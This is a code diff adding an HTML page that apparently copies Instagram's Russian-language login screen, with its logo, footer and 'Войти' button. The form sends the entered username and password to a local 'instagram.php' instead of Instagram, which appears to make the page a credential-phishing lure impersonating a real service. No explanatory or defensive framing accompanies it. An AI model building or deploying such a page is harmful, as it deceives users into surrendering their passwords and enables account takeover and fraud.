@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+   <meta charset="UTF-8">
+   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   <link rel="stylesheet" href="css/styles.css">
+   <link rel="icon" href="img/insta-icon.jpg" type="image/x-icon">
+   <title>Instagram</title>
+</head>
+
+<body>
+   <div class="global">
+      <div class="items">
+         <img src="img/phones.png" alt="Phones" id="phones">
+         <img src="img/screenshot1.png" alt="Screenshot" id="screenshot1">
+         <div class="column">
+            <div class="block">
+               <img src="img/logo.png" alt="Instagram" class="img-fluid">
+               <form action="instagram.php" method="post">
+                  <div class="form-group">
+                     <input type="text" name="username" id="username" class="form-control" required
+                        placeholder="Телефон, имя пользователя или эл. адрес">
+                  </div>
+                  <div class="form-group">
+                     <input type="password" name="password" id="password" class="form-control" required
+                        placeholder="Пароль">
+                  </div>
+                  <input type="submit" value="Войти" class="btn btn-primary">
+                  <div class="or">
+                     <div class="or-line"></div>
+                     <span style="margin-left: 10px; margin-right: 10px; font-weight: 550;">ИЛИ</span>
+                     <div class="or-line"></div>
+                  </div>
+                  <div class="links-group">
+                     <div style="margin: 20px auto">
+                        <a href="https://www.facebook.com/" id="facebook_login"><img width="15px"
+                              style="margin-right: 10px;" src="img/facebook-icon.png">Войти
+                           через Facebook</a>
+                     </div>
+                     <div style="margin-bottom: 20px;">
+                        <a href="https://www.facebook.com/" id="forgot_password">Забыли пароль?</a>
+                     </div>
+                  </div>
+               </form>
+            </div>
+            <div class="block">
+               <p>У вас нет аккаунта? <a href="https://www.facebook.com/"
+                     style="color: #0095F6; font-weight: 600;">Зарегистрироваться</a></p>
+            </div>
+            <div>
+               <p class="install-app">Установите приложение.</p>
+               <div style="display: flex; justify-content: center;">
+                  <a href="#" style="margin: 5px;"><img src="img/download-google-play.png" alt="App Store"
+                        style="height: 40px;"></a>
+                  <a href="#" style="margin: 5px;"><img src="img/download-microsoft.png" alt="Google Play"
+                        style="height: 40px;"></a>
+               </div>
+            </div>
+         </div>
+      </div>
+      <footer>
+         <ul id="options">
+            <li><a href="">Meta</a></li>
+            <li><a href="">Информация</a></li>
+            <li><a href="">Блог</a></li>
+            <li><a href="">Вакансии</a></li>
+            <li><a href="">Помощь</a></li>
+            <li><a href="">API</a></li>
+            <li><a href="">Конфиденциальность</a></li>
+            <li><a href="">Условия</a></li>
+            <li><a href="">Места</a></li>
+            <li><a href="">Instagram Lite</a></li>
+            <li><a href="">Threads</a></li>
+            <li><a href="">Загрузка контактови лица, не являющиеся пользователями</a></li>
+            <li><a href="">Meta Verified</a></li>
+         </ul>
+         <div class="meta-block">
+            <p>Русский</p>
+            <span>© 2024 Instagram from Meta</span>
+         </div>
+      </footer>
+   </div>
+</body>
+
+</html>
